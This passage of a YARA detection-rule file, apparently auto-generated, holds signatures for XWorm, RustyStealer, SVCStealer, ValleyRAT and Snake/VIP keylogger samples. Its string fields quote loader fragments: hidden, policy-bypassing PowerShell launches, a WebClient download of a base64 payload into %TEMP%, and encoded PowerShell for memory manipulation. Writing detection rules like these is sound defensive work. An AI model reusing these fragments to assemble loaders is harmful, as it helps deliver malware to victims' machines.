      hash1 = "95774c5119542e158a8976cfd523bd09c53c2125499e42b7541222c52f2b020f"
   strings:
      $x1 = "var fullCmd = 'powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"' + psCommand.replace(/\"/g, '\"" ascii /* score: '48.00'*/
      $x2 = "var fullCmd = 'powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"' + psCommand.replace(/\"/g, '\"" ascii /* score: '48.00'*/
      $x3 = "hAFHugf.Run(\"powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File \\\"\" + auiJUAA + \"\\\"\", 0, false)" ascii /* score: '43.00'*/
      $s4 = "    var FiUOaVU0 = \"powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File \\\"\" + auiJUAA + \"\\\"\";" fullword ascii /* score: '28.00'*/
      $s5 = "var auiJUAA = hAFHugf.ExpandEnvironmentStrings(\"%TEMP%\") + \"\\\\Winlog.ps1\";" fullword ascii /* score: '28.00'*/
      $s6 = "var uBMuFaA = hAFHugf.ExpandEnvironmentStrings(\"%TEMP%\") + \"\\\\OrqBAFU.txt\";" fullword ascii /* score: '26.00'*/
      $s7 = "    var auiJUAA = hAFHugf.ExpandEnvironmentStrings(\"%TEMP%\") + \"\\\\Winlog.ps1\";" fullword ascii /* score: '23.00'*/
      $s8 = "var temp = shell.ExpandEnvironmentStrings(\"%TEMP%\");" fullword ascii /* score: '23.00'*/
      $s9 = "var txtPath = temp + \"\\\\OrqBAFU.txt\"; // onde vai salvar o .txt" fullword ascii /* score: '22.00'*/
      $s10 = "  + \"$b64 = Get-Content -Path $txt -Raw;\"" fullword ascii /* score: '22.00'*/
      $s11 = "    \"        if (Get-Process -Name $process -ErrorAction SilentlyContinue) {\\n\" +" fullword ascii /* score: '22.00'*/
      $s12 = "  + \"(New-Object System.Net.WebClient).DownloadFile($url, $txt);\"" fullword ascii /* score: '20.00'*/
      $s13 = "// Executa o comando" fullword ascii /* score: '19.00'*/
      $s14 = "shell.Run(fullCmd, 0, false);" fullword ascii /* score: '18.00'*/
      $s15 = "    \"        $b64 = Get-Content -Path '\" + uBMuFaA + \"' -Raw;\\n\" +" fullword ascii /* score: '17.00'*/
   condition:
      uint16(0) == 0x3839 and filesize < 800KB and
      1 of ($x*) and 4 of them
}

rule XWorm_signature__6 {
   meta:
      description = "_subset_batch - file XWorm(signature).xlsx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "d217b5c8d076eafa8a8cde6b80fe27a2cb79c27e52ea1d1cd26a27d6159c0b1c"
   strings:
      $s1 = "5+%f%>" fullword ascii /* score: '9.00'*/ /* hex encoded string '_' */
   condition:
      uint16(0) == 0x4b50 and filesize < 2000KB and
      all of them
}

rule XWorm_signature__7 {
   meta:
      description = "_subset_batch - file XWorm(signature).zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "0ea16c23593dbb7ebc6ed9b141e138fda9e0f399f813735f5aa0efef7f5cd5be"
   strings:
      $s1 = "qvqwqyq" fullword ascii /* score: '8.00'*/
      $s2 = "qpqrquq" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 100KB and
      all of them
}

rule XWorm_signature__22d5a3b5 {
   meta:
      description = "_subset_batch - file XWorm(signature)_22d5a3b5.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "22d5a3b5c4929954160313e737eecbe3b7f8196892440caf9d4cfeeabd5b9d65"
   strings:
      $s1 = "EIoBZ.ShellExecute(\"cscript\",\"\\\"\" + destino + \"\\\"\",\"\", \"open\",0)" fullword wide /* score: '28.00'*/
      $s2 = "var SQKzN = shell.ExpandEnvironmentStrings(\"%APPDATA%\");" fullword wide /* score: '26.00'*/
      $s3 = "EIoBZ.ShellExecute(kVrLB, (goMUH + OqDlC + znaeL ) + \"\\\"\",\"\", \"open\",0);;;;;;;;;;;;;;;;;;;;;;;;;;;;" fullword wide /* score: '25.00'*/
      $s4 = "      return IviVF - ZguUp;console.log(getGrades(\"" fullword wide /* score: '24.00'*/
      $s5 = "      return YKUYQ - jPntr;console.log(getGrades(90, 100, 75, 40, 89, 95));" fullword wide /* score: '24.00'*/
      $s6 = "  console.log(getGrades(\"" fullword wide /* score: '21.00'*/
      $s7 = "  console.log(\"" fullword wide /* score: '16.00'*/
      $s8 = "\");  console.log(\"" fullword wide /* score: '16.00'*/
      $s9 = "      console.log(getGrades(\"" fullword wide /* score: '16.00'*/
      $s10 = "      return  console.log(getGrades(\"" fullword wide /* score: '16.00'*/
      $s11 = "vtsfh += \"};$yJWTX = BaseMy_tatCO;\" + kVrLB + \" ($yJWTX -replace '%vVlGz%','\" + AfbZF + \"');\" ;" fullword wide /* score: '16.00'*/
      $s12 = "var goMUH = \" -executionpolicy \" ;" fullword wide /* score: '16.00'*/
      $s13 = "var shell = new ActiveXObject(\"WScript.Shell\");" fullword wide /* score: '15.00'*/
      $s14 = "var OqDlC = \"bypass \" ;" fullword wide /* score: '15.00'*/
      $s15 = "  var AfbZF = WScript.ScriptFullName " fullword wide /* score: '14.00'*/
   condition:
      uint16(0) == 0xfeff and filesize < 200KB and
      8 of them
}

rule XWorm_signature__31c4f7e4 {
   meta:
      description = "_subset_batch - file XWorm(signature)_31c4f7e4.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "31c4f7e4493d144c3f76b16b4810249ea873c1f183ab0537db5c8e2a67ef16ec"
   strings:
      $x1 = "PhotonController.WriteLine(\"::7jrP9BLsaxk/AYUKDEhhU+Z70KsJt1zSGm+6yhTw4mXFuKdT5xDoLnqQKemEa2G2IhFosBC8jq2aBir2MU0t2En1tZYEwJazA" ascii /* score: '45.00'*/
      $x2 = "PhotonController.WriteLine(\"%QFIODCG%s%QFIODCG%%QFIODCG%e%QFIODCG%%QFIODCG%t%QFIODCG% \\\"JIQJUH=;$PVGEVJRA = [ConsoILZBDEQle]:" ascii /* score: '36.00'*/
      $s3 = "GetObject(ProtonBuffer).Get(InterstellarEngine).Create('cmd /c ' + NexusSwitch, null, null, null);" fullword ascii /* score: '29.00'*/
      $s4 = "PhotonController.WriteLine(\"%NRAQMMG%s%NRAQMMG%%NRAQMMG%e%NRAQMMG%%NRAQMMG%t%NRAQMMG% JEURHO=C:\\\\Windows\\\\System32\\\\%JDHL" ascii /* score: '25.00'*/
      $s5 = "PhotonController.WriteLine(\"%NRAQMMG%s%NRAQMMG%%NRAQMMG%e%NRAQMMG%%NRAQMMG%t%NRAQMMG% JEURHO=C:\\\\Windows\\\\System32\\\\%JDHL" ascii /* score: '25.00'*/
      $s6 = "r2goLGHvMbwoIOqsBfyWCcGP0L1tfJRteij55RQMpy9qjtDumppoJdNUBHmqzpZNdyzCtl43V5vZayqJuRwxsAHA7gyuL7XtXcenNVHVCnRCxf4c7xwJZ2OPCig1UAgG" ascii /* score: '21.00'*/
      $s7 = "ZSA9IEJ1aWxkLVN0cmF3YmVycnlEZWxlZ2F0ZSAkc3RyYXdiZXJyeVByb3RlY3Rpb25BZGRyZXNzIEAoW0ludFB0cl0sW1VJbnQzMl0sW1VJbnQzMl0sW1VJbnQzMl0u" ascii /* base64 encoded string 'e = Build-StrawberryDelegate $strawberryProtectionAddress @([IntPtr],[UInt32],[UInt32],[UInt32].' */ /* score: '21.00'*/
      $s8 = "b2JhbDpzdHJhd2JlcnJ5RGF0YS5iZXJyeUFkZHJlc3NGdW5jdGlvbiA9IFtieXRlW11dQCg3MSwxMDEsMTE2LDgwLDExNCwxMTEsOTksNjUsMTAwLDEwMCwxMTQsMTAx" ascii /* base64 encoded string 'obal:strawberryData.berryAddressFunction = [byte[]]@(71,101,116,80,114,111,99,65,100,100,114,101' */ /* score: '21.00'*/
      $s9 = "Y3Rpb25EZWxlZ2F0ZSA9IEJ1aWxkLVN0cmF3YmVycnlEZWxlZ2F0ZSAkc3dlZXRQcm90ZWN0aW9uQWRkcmVzcyBAKFtJbnRQdHJdLFtVSW50MzJdLFtVSW50MzJdLFtV" ascii /* base64 encoded string 'ctionDelegate = Build-StrawberryDelegate $sweetProtectionAddress @([IntPtr],[UInt32],[UInt32],[U' */ /* score: '21.00'*/
      $s10 = "ZWxlZ2F0ZSA9IEJ1aWxkLVN0cmF3YmVycnlEZWxlZ2F0ZSAkc3RyYXdiZXJyeVByb2NlZHVyZUFkZHJlc3MgQChbc3RyaW5nXSxbVUludDY0XS5NYWtlQnlSZWZUeXBl" ascii /* base64 encoded string 'elegate = Build-StrawberryDelegate $strawberryProcedureAddress @([string],[UInt64].MakeByRefType' */ /* score: '21.00'*/
      $s11 = "OlJlYWRJbnQzMihbSW50UHRyXSgkc3RyYXdiZXJyeUJhc2VBZGRyZXNzICsgMzYgKyAoJHN3ZWV0U2VydmljZUNvdW50ICogJHN0cmF3YmVycnlQb2ludGVyU2l6ZSkp" ascii /* base64 encoded string ':ReadInt32([IntPtr]($strawberryBaseAddress + 36 + ($sweetServiceCount * $strawberryPointerSize))' */ /* score: '21.00'*/
      $s12 = "b3J5TWFuYWdlcjo6UmVhZEludDY0KFtJbnRQdHJdJHN0cmF3YmVycnlCYXNlQWRkcmVzcywgNjQgKyAoJHN3ZWV0U2VydmljZUNvdW50ICogJHN0cmF3YmVycnlQb2lu" ascii /* base64 encoded string 'oryManager::ReadInt64([IntPtr]$strawberryBaseAddress, 64 + ($sweetServiceCount * $strawberryPoin' */ /* score: '21.00'*/
      $s13 = "ZXJyeUhhbmRsZVJlZmVyZW5jZSA9IE5ldy1PYmplY3QgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkhhbmRsZVJlZihbSW50UHRyXTo6WmVybywgJHN3ZWV0" ascii /* base64 encoded string 'erryHandleReference = New-Object System.Runtime.InteropServices.HandleRef([IntPtr]::Zero, $sweet' */ /* score: '21.00'*/
      $s14 = "dXJlRGVsZWdhdGUgPSBCdWlsZC1TdHJhd2JlcnJ5RGVsZWdhdGUgJHN0cmF3YmVycnlQcm9jZWR1cmVBZGRyZXNzIEAoW3N0cmluZ10sW1VJbnQzMl0uTWFrZUJ5UmVm" ascii /* base64 encoded string 'ureDelegate = Build-StrawberryDelegate $strawberryProcedureAddress @([string],[UInt32].MakeByRef' */ /* score: '21.00'*/
      $s15 = "dHJhd2JlcnJ5RGF0YS5zd2VldEFzc2VtYmx5ID0gJHN3ZWV0RGVjb2Rlci5HZXRTdHJpbmcoJGJlcnJ5Q29udmVydGVyOjpGcm9tQmFzZTY0U3RyaW5nKCdVM2x6ZEdW" ascii /* base64 encoded string 'trawberryData.sweetAssembly = $sweetDecoder.GetString($berryConverter::FromBase64String('U3lzdGV' */ /* score: '21.00'*/
   condition:
      uint16(0) == 0x6176 and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule XWorm_signature__c0be3306 {
   meta:
      description = "_subset_batch - file XWorm(signature)_c0be3306.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "c0be33068b69f05dec7c85ba41b9ed08ae5e665213a61bb2022cafb9885873a5"
   strings:
      $s1 = "qyuegmbpeuuuqycg = qyuegmbpeuuuqycg & \";$GftsOTSaty = ($GftsOTSaty -replace '%JkQasDfgrTg%', '\" & replace(Popolizio,\"\\\",\"$" wide /* score: '17.00'*/
      $s2 = "qyuegmbpeuuuqycg = qyuegmbpeuuuqycg & \"[system.Convert]::FromBase64String( ($IuJUJJZz -replace '" fullword wide /* score: '15.00'*/
      $s3 = "pxdsnxcmuaugsfgq.Run \"powershell \" & (qyuegmbpeuuuqycg) , 0, false" fullword wide /* score: '15.00'*/
      $s4 = "Popolizio = WScript.ScriptFullName" fullword wide /* score: '14.00'*/
      $s5 = "qyuegmbpeuuuqycg = qyuegmbpeuuuqycg & \";$GftsOTSaty = [system.Text.Encoding]::UTF8.GetString( \"" fullword wide /* score: '12.00'*/
      $s6 = "set pxdsnxcmuaugsfgq =  CreateObject(\"WScript.Shell\")" fullword wide /* score: '12.00'*/
   condition:
      uint16(0) == 0xfeff and filesize < 1000KB and
      all of them
}

/* Super Rules ------------------------------------------------------------- */

rule _RustyStealer_signature__bca27bf2_RustyStealer_signature__f1c43758_0 {
   meta:
      description = "_subset_batch - from files RustyStealer(signature)_bca27bf2.msi, RustyStealer(signature)_f1c43758.msi"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "bca27bf22811258f9e707c8ba597663f4b8610a34398c64ac8eacd28cd1ff09e"
      hash2 = "f1c43758101f87596e4f115fc60f6538cd010c59b5404c5b3752332d06290fac"
   strings:
      $x1 = "Failed to get elevation token from process." fullword ascii /* score: '38.00'*/
      $x2 = "upDependenciesStartNamePasswordArgumentsDescriptionPDQ Connect AgentLOCALSYSTEM--servicePDQ.com software deployment serviceServi" ascii /* score: '34.00'*/
      $s3 = "eSizeVersionLanguageAttributesSequence05.8.23.0p-lw7ji3.exe|pdq-connect-agent.exeComponent.pdqconnectagentpdqconnectagent8e1yztm" ascii /* score: '30.00'*/
      $s4 = "failed to get WixUnelevatedShellExecTarget" fullword ascii /* score: '30.00'*/
      $s5 = "failed to get WixShellExecBinaryId" fullword ascii /* score: '29.00'*/
      $s6 = "ShelExecUnelevated failed with target %ls" fullword ascii /* score: '28.00'*/
      $s7 = "failed to get handle to kernel32.dll" fullword ascii /* score: '28.00'*/
      $s8 = "Skipping ConfigurePerfmonManifestUnregister() because the target system does not support perfmon manifest" fullword ascii /* score: '28.00'*/
      $s9 = "failed to process target from CustomActionData" fullword ascii /* score: '28.00'*/
      $s10 = "Skipping ConfigureEventManifestRegister() because the target system does not support event manifest" fullword ascii /* score: '28.00'*/
      $s11 = "Skipping ConfigureEventManifestUnregister() because the target system does not support event manifest" fullword ascii /* score: '28.00'*/
      $s12 = "Skipping ConfigurePerfmonManifestRegister() because the target system does not support perfmon manifest" fullword ascii /* score: '28.00'*/
      $s13 = "tDirPDQtlmcolwe|PDQConnectAgentProgramFiles64Folderiqrp47ah|Downloadsgbexn3uq|PDQConnectAgentCommonAppDataFolderTARGETDIRPFiles6" ascii /* score: '27.00'*/
      $s14 = "WixUnelevatedShellExecTarget is %ls" fullword ascii /* score: '27.00'*/
      $s15 = "uenceValidateProductIDInstallExecuteSequenceVersionNTNOT UPGRADINGPRODUCTCODEMsiConfigureServicesVersionNT>=600 (1) (NOT UPGRADI" ascii /* score: '27.00'*/
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 15000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _SVCStealer_signature__456e8615ad4320c9f54e50319a19df9c_imphash__SVCStealer_signature__456e8615ad4320c9f54e50319a19df9c_imph_1 {
   meta:
      description = "_subset_batch - from files SVCStealer(signature)_456e8615ad4320c9f54e50319a19df9c(imphash).exe, SVCStealer(signature)_456e8615ad4320c9f54e50319a19df9c(imphash)_0931b295.exe, SVCStealer(signature)_456e8615ad4320c9f54e50319a19df9c(imphash)_59c6cebf.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "83160cab62b17b3e27bf30dc7ad8ca99d3892e31d18a9a0c404b832312c4264e"
      hash2 = "0931b295ce7053441ed05872c12493ed9b4bbca14ae9642d1d073d8a52ec5e0c"
      hash3 = "59c6cebfc1b60e8fed91078d412784d3a888034356bd8928a67921d56d222b29"
   strings:
      $x1 = "bapi-ms-win-core-processenvironment-l1-1-0.dll" fullword ascii /* score: '31.00'*/
      $x2 = "bapi-ms-win-core-processthreads-l1-1-0.dll" fullword ascii /* score: '31.00'*/
      $x3 = "bapi-ms-win-crt-process-l1-1-0.dll" fullword ascii /* score: '31.00'*/
      $x4 = "bapi-ms-win-core-processthreads-l1-1-1.dll" fullword ascii /* score: '31.00'*/
      $s5 = "bapi-ms-win-core-libraryloader-l1-1-0.dll" fullword ascii /* score: '29.00'*/
      $s6 = "bapi-ms-win-core-namedpipe-l1-1-0.dll" fullword ascii /* score: '29.00'*/
      $s7 = "bapi-ms-win-crt-runtime-l1-1-0.dll" fullword ascii /* score: '23.00'*/
      $s8 = "bapi-ms-win-crt-filesystem-l1-1-0.dll" fullword ascii /* score: '23.00'*/
      $s9 = "bapi-ms-win-core-errorhandling-l1-1-0.dll" fullword ascii /* score: '23.00'*/
      $s10 = "bucrtbase.dll" fullword ascii /* score: '23.00'*/
      $s11 = "bapi-ms-win-core-rtlsupport-l1-1-0.dll" fullword ascii /* score: '23.00'*/
      $s12 = "bapi-ms-win-core-file-l1-2-0.dll" fullword ascii /* score: '20.00'*/
      $s13 = "bapi-ms-win-crt-time-l1-1-0.dll" fullword ascii /* score: '20.00'*/
      $s14 = "bapi-ms-win-core-timezone-l1-1-0.dll" fullword ascii /* score: '20.00'*/
      $s15 = "bapi-ms-win-core-file-l1-1-0.dll" fullword ascii /* score: '20.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 17000KB and pe.imphash() == "456e8615ad4320c9f54e50319a19df9c" and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _ValleyRAT_signature__15d53913ba494ccc61512607f46fddf4_imphash__ValleyRAT_signature__15d53913ba494ccc61512607f46fddf4_imphas_2 {
   meta:
      description = "_subset_batch - from files ValleyRAT(signature)_15d53913ba494ccc61512607f46fddf4(imphash).exe, ValleyRAT(signature)_15d53913ba494ccc61512607f46fddf4(imphash)_1e647e0f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "a226d9a4f1456774355d091f2f680286508e204dfecc9b439697140ac41ecb23"
      hash2 = "1e647e0ff0bc7a5dcfe1577093e2182fed5ffb01b6d18ebeec9d2d0a98fd19fa"
   strings:
      $s1 = "bpython3.dll" fullword ascii /* score: '23.00'*/
      $s2 = "tFailed to import symbol %hs from Tk DLL." fullword wide /* score: '15.00'*/
      $s3 = "oMlMnMmMo" fullword ascii /* base64 encoded string '2S'2c(' */ /* score: '14.00'*/
      $s4 = ".~.~.~.~.~" fullword ascii /* reversed goodware string '~.~.~.~.~.' */ /* score: '11.00'*/
      $s5 = "*XeUh]qEye" fullword ascii /* score: '9.00'*/
      $s6 = "00:>2:-:1" fullword ascii /* score: '9.00'*/ /* hex encoded string '!' */
      $s7 = "<'<3<9<?<" fullword ascii /* score: '9.00'*/ /* hex encoded string '9' */
      $s8 = "\"4*4!$%,'" fullword ascii /* score: '9.00'*/ /* hex encoded string 'D' */
      $s9 = "iibilid" fullword ascii /* score: '8.00'*/
      $s10 = "wwtwvwqwuws" fullword ascii /* score: '8.00'*/
      $s11 = "wopotorovoqouow" fullword ascii /* score: '8.00'*/
      $s12 = "okhklkjknkikmkkko" fullword ascii /* score: '8.00'*/
      $s13 = "andnbneng" fullword ascii /* score: '8.00'*/
      $s14 = "oyhydybyjynyayeymykyo" fullword ascii /* score: '8.00'*/
      $s15 = "cxlxjxfho" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 13000KB and pe.imphash() == "15d53913ba494ccc61512607f46fddf4" and ( 8 of them )
      ) or ( all of them )
}

rule _SnakeKeylogger_signature__d9c337ee_VIPKeylogger_signature__0658bec7_VIPKeylogger_signature__9d849f2b_VIPKeylogger_signature_3 {
   meta:
      description = "_subset_batch - from files SnakeKeylogger(signature)_d9c337ee.js, VIPKeylogger(signature)_0658bec7.js, VIPKeylogger(signature)_9d849f2b.js, VIPKeylogger(signature)_bdecda02.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "d9c337ee10e98a2117934734b08ae83cdde68b5deb79ac8318849f69e0189920"
      hash2 = "0658bec79bf463dc73868095548daf287c01339744e02cedeac127b7372ba2c4"
      hash3 = "9d849f2bea8b25f36df00f1ef3d66178f6ce100a0b2e5805f6223e9c83a8cc9c"
      hash4 = "bdecda02610e839b0b08463c371d4df5aee7425f772f5a3ba53a086957fb2721"
   strings:
      $s1 = "//Undumped stedtillggene, acholia! terras!" fullword ascii /* score: '18.00'*/
      $s2 = "//Monosyllogism. execeptional, skidtfisket outshouting; delocalizing" fullword ascii /* score: '16.00'*/
      $s3 = "//Ekstemporalspillets: udspyendes jobtilbud sukkerroer" fullword ascii /* score: '16.00'*/
      $s4 = "var Rinas = \"Bountihead: halters:\";" fullword ascii /* score: '15.00'*/
      $s5 = "//Agentromanens accountantship; kardinalsystemer182" fullword ascii /* score: '15.00'*/
      $s6 = "//Friturestegningen, harstrong: genfortl. interprocessor: infanterierne." fullword ascii /* score: '15.00'*/
      $s7 = "//Spaltningsprocessen krukkende" fullword ascii /* score: '15.00'*/
      $s8 = "var Natriumbenzoat = \"Apologizers blussenes:\";" fullword ascii /* score: '15.00'*/
      $s9 = "//Ototoxicities selvbetjeningslokalets. microprocessors" fullword ascii /* score: '15.00'*/
      $s10 = "//Microprocessor. bordingens." fullword ascii /* score: '15.00'*/
      $s11 = "//Preprocessorers uvula124 overlssendes" fullword ascii /* score: '15.00'*/
      $s12 = "//Contravindication systempartner ringetoner adherent." fullword ascii /* score: '15.00'*/
      $s13 = "//Paralyses! municipalize omredaktion eddaerne fordjelsesprocesses?" fullword ascii /* score: '15.00'*/
      $s14 = "//prexes bundlerooted verdensprocessen!" fullword ascii /* score: '15.00'*/
      $s15 = "//Processionerne? raakostsalaternes patjfen! sintret. susanna," fullword ascii /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x0a0d and filesize < 900KB and ( 8 of them )
      ) or ( all of them )
}

rule _ValleyRAT_signature__ValleyRAT_signature__76a43d73_ValleyRAT_signature__cc2935d9_4 {
   meta:
      description = "_subset_batch - from files ValleyRAT(signature).msi, ValleyRAT(signature)_76a43d73.msi, ValleyRAT(signature)_cc2935d9.msi"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "5de5d098e7918e7b23cfdf7e21950afbfcceecebed42302b2554263d29571a99"
      hash2 = "76a43d739674ee3fe3f3aff78c6df2e844723a4e4dec29be95261df257d3f799"
      hash3 = "cc2935d9a93e73f312495b52fbe670727ae086b4d64467435d380b89a5e248f8"
   strings:
      $x1 = "AttributesPatchSizeFile_PatchTypeActionConditionSequenceCostFinalizeCostInitializeTableNameInstallFinalizeInstallInitializeInsta" ascii /* score: '56.00'*/
      $x2 = "WriteEnvironmentStringsProgressDlgAdminWelcomeDlgAI_SET_ADMINExecuteActionExitDialogFatalErrorPrepareDlgUserExitaicustact.dlldia" ascii /* score: '41.00'*/
      $x3 = "SetProgressProgressIgnoreChangeSelectionNoItemsEnabledSelectionDescriptionSelectionSizeSelectionPathSelectionPathOnVisible2.0.19" ascii /* score: '38.00'*/
      $x4 = "<assembly manifestVersion=\"1.0\" xmlns=\"urn:schemas-microsoft-com:asm.v1\"><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3" ascii /* score: '35.00'*/
      $x5 = "edVersionNTInstallExecuteAI_USE_STD_ODBC_MGRIsolateComponentsRedirectedDllSupportPATCHAI_EXTREG <> \"No\"AI_UPGRADE<>\"No\"AI_US" ascii /* score: '32.00'*/
      $x6 = "%s\\System32\\cmd.exe" fullword wide /* score: '32.00'*/
      $x7 = "[SystemFolder]msiexec.exe" fullword wide /* score: '32.00'*/
      $s8 = "temp.exe" fullword ascii /* score: '29.00'*/
      $s9 = "WShell32.dll" fullword wide /* score: '28.00'*/
      $s10 = "calized description displayed in progress dialog and log when action is executing.Optional localized format template used to for" ascii /* score: '26.00'*/
      $s11 = "<!-- Generator: Adobe Illustrator 25.2.3, SVG Export Plug-In . SVG Version: 6.00 Build 0)  -->" fullword ascii /* score: '23.00'*/
      $s12 = "log.svgviewer.execmdlinkarrowbanner.scale125.jpgbanner.scale150.jpgbanner.scale200.jpgbanner.svgdialog.scale125.jpgdialog.scale1" ascii /* score: '23.00'*/
      $s13 = "aicustact.dll" fullword ascii /* score: '23.00'*/
      $s14 = "Execute operation:" fullword wide /* score: '23.00'*/
      $s15 = "NetUserModalsGet will use empty target computer name." fullword wide /* score: '23.00'*/
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 7000KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _SnakeKeylogger_signature__01d357eecc71f4f0078f9b283e83da99_imphash__SnakeKeylogger_signature__087fa31dc7d77feb208c5dda56c8c_5 {
   meta:
      description = "_subset_batch - from files SnakeKeylogger(signature)_01d357eecc71f4f0078f9b283e83da99(imphash).exe, SnakeKeylogger(signature)_087fa31dc7d77feb208c5dda56c8c688(imphash).exe, SnakeKeylogger(signature)_1a41b236e54319b64f65b4f667766e1e(imphash).exe, SnakeKeylogger(signature)_54e8aab77a741ddbe4f0e1d5294d2ba8(imphash).exe, SnakeKeylogger(signature)_6aa7899735e1f990142bacb29f0dd5de(imphash).exe, SnakeKeylogger(signature)_799e73863806df2964d80d12ce4e61ea(imphash).exe, SnakeKeylogger(signature)_9154058d1dfc0a0203928a4ed25ab791(imphash).exe, SnakeKeylogger(signature)_9500a3099a7bd06339507f7c4c55ecd8(imphash).exe, SnakeKeylogger(signature)_b069d88b33e75313d6c2f825eb1f4188(imphash).exe, SnakeKeylogger(signature)_b069d88b33e75313d6c2f825eb1f4188(imphash)_8ac1fdc4.exe, SnakeKeylogger(signature)_b4d3f5d989eff50a07c3a8d85868cba4(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "05b3f0bb496b998361f8bad6586ab07432cb52d1b4414ce403a00648571b531e"
      hash2 = "a24110da2d42316258533bbff2c7c9852baa87bbb92be9f1bbc2858035d1cb76"
      hash3 = "37599b38dcbe50dd01c413d2c5aeccc6582d640cf81ad4eb1f5877ed25c40d5d"
      hash4 = "f8343679b868073000380e233f32b10a04a9b4f3e28e7eb7bf58107566f9043c"
      hash5 = "664e90e815ce56b91d51e107d0bb76b4bc5e4ae3ff57de6ce99635f6357771b5"
      hash6 = "96cdecba4b523f512f7b3e2ad2d234f379fc2bdfd6d6b0b1499e7ee34f498341"
      hash7 = "fc7b617c0317fa605e60e44a35bc6f6fb0e5d30b0cd5b0127034069bf5810317"
      hash8 = "74a40d2f809116abb9da9d754950e8ef484c6344087718d6f12ee36dff4db768"
      hash9 = "26d35dab5514132671d904227e1b2306054138b3e84fe04bf6b7af1c0bfe0505"
      hash10 = "8ac1fdc40a9f98635a344803303fbd13bea0ec3c04c7570764382c31c2eeb8b6"
      hash11 = "c24f664303cf46a812706b9e98d3f714c9fd2eac83a54ad2e53681f103438b2d"
   strings:
      $x1 = "System.ComponentModel.Design.IDesigner, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e08" fullword wide /* score: '34.00'*/
      $x2 = "System.Diagnostics.Design.ProcessDesigner, System.Design, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" fullword ascii /* score: '32.00'*/
      $x3 = "System.Diagnostics.Design.ProcessModuleDesigner, System.Design, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3" ascii /* score: '32.00'*/
      $x4 = "System.Diagnostics.Design.ProcessModuleDesigner, System.Design, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3" ascii /* score: '32.00'*/
      $x5 = "NSystem.Private.Reflection.Execution.dllBSystem.Private.StackTraceMetadata" fullword ascii /* score: '31.00'*/
      $x6 = "<System.Diagnostics.Process.dll" fullword ascii /* score: '31.00'*/
      $x7 = "System.Linq.dllFSystem.Private.Reflection.Execution" fullword ascii /* score: '31.00'*/
      $x8 = "JSystem.Private.StackTraceMetadata.dll2System.Private.TypeLoader" fullword ascii /* score: '31.00'*/
      $s9 = "LSystem.Diagnostics.FileVersionInfo.dll4System.Diagnostics.Process" fullword ascii /* score: '30.00'*/
      $s10 = "4System.Private.CoreLib.dll" fullword ascii /* score: '29.00'*/
      $s11 = ":System.Private.TypeLoader.dll8System.Security.Cryptography" fullword ascii /* score: '28.00'*/
      $s12 = "System.Core, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" fullword ascii /* score: '27.00'*/
      $s13 = "TargetvM:System.Security.Cryptography.CryptoConfigForwarder.#cctor" fullword ascii /* score: '25.00'*/
      $s14 = "DeleteTimerXSystem.Threading.IThreadPoolWorkItem.Execute" fullword ascii /* score: '25.00'*/
      $s15 = "BSystem.Collections.NonGeneric.dll@System.ComponentModel.Primitives" fullword ascii /* score: '25.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 12000KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _RustyStealer_signature__e028dd160a9b25bfd157794a3702c831_imphash__RustyStealer_signature__e028dd160a9b25bfd157794a3702c831__6 {
   meta:
      description = "_subset_batch - from files RustyStealer(signature)_e028dd160a9b25bfd157794a3702c831(imphash).exe, RustyStealer(signature)_e028dd160a9b25bfd157794a3702c831(imphash)_14198cd5.exe, RustyStealer(signature)_e028dd160a9b25bfd157794a3702c831(imphash)_25fc7620.exe, RustyStealer(signature)_e028dd160a9b25bfd157794a3702c831(imphash)_32496cbe.exe, RustyStealer(signature)_e028dd160a9b25bfd157794a3702c831(imphash)_385d4a90.exe, RustyStealer(signature)_e028dd160a9b25bfd157794a3702c831(imphash)_9a6e7696.exe, RustyStealer(signature)_e028dd160a9b25bfd157794a3702c831(imphash)_ba6656dc.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "9032cfc2074c405dbcb967bfda8c8295d34db4f6cf56727d3a2f7fe4ce49abd9"
      hash2 = "14198cd53c85c8cdf6b19b3c915844bf51cea45b29133e20011dcdd754a1beae"
      hash3 = "25fc762046ac2e9fbb698eef51b0881d7b3af3e2038bf8c252004426a6af2f75"
